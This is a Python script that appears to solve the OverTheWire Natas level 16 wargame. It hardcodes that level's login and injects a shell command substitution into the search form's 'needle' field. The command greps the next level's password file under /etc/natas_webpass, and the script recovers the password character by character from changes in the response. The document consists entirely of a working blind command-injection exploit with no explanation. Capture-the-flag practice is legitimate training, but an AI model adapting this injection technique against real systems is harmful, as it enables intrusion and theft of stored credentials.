import requests
from requests.auth import HTTPBasicAuth

username = 'natas16'
password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'

characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

out = ""
for i in range(0, 32):
    for j in characters:
        command = f"^$(grep -o ^{out+j} /etc/natas_webpass/natas17)A"
        payload = {'needle': command, 'submit': 'search'}
        result = requests.get('http://natas16.natas.labs.overthewire.org/', auth=HTTPBasicAuth(username, password), params=payload)
        str1 = result.text
        # print(str1)
        start = str1.find('<pre>\n') + len('<pre>\n')
        end = str1.find('</pre>')
        str2 = [x for x in str1[start:end].split('\n')]
        if str2[0] != "African":
            out += j
            print(out)
            break
print(out)
